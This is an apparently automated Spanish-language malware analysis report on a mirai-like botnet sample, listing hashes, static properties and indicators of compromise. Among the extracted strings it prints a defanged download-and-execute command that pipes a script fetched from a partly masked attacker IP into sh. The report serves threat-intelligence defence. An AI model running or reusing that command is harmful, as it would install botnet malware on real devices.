# 🧬 Payload Analysis

`112e38beeeb3265e8a85c414412c9cb4d91df835363ad0d08233d6d72f500290`

## 📌 Resumen

Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se asociaron 7 comandos observados o extraídos.

## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai-like`
- **Confianza de familia:** `Media`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:35:06+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `112e38beeeb3265e8a85c414412c9cb4d91df835363ad0d08233d6d72f500290`
- **MD5:** `cf35611756aab4fec86483410328a6ad`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 1.2 KiB |
| Entropía | 5.51 |
| Strings | 32 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=data; iocs=10

## 🖥️ Comandos observados / extraídos

```text
[4ladmin@ubnt:~$ (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh
[4lcurl: option -k not recognized
[4lwget: invalid option -- 'no-check-certificate'
curl: try 'curl --help' or 'curl --manual' for more information
sshd:x:22:22:sshd:/var/empty:/bin/false
Try `wget --help' for more options.
Usage: wget [OPTION]... [URL]...
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 217.60.195.XXX | static_analysis |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| hash | 112e38beeeb3265e8a85c414412c9cb4d91df835363ad0d08233d6d72f500290 | static_analysis |
| command | [4ladmin@ubnt:~$ (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh | strings |
| command | [4lcurl: option -k not recognized | strings |
| command | [4lwget: invalid option -- 'no-check-certificate' | strings |
| command | curl: try 'curl --help' or 'curl --manual' for more information | strings |
| command | sshd:x:22:22:sshd:/var/empty:/bin/false | strings |
| command | Try `wget --help' for more options. | strings |
| command | Usage: wget [OPTION]... [URL]... | strings |
| ip | [internal-ip-redacted] | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
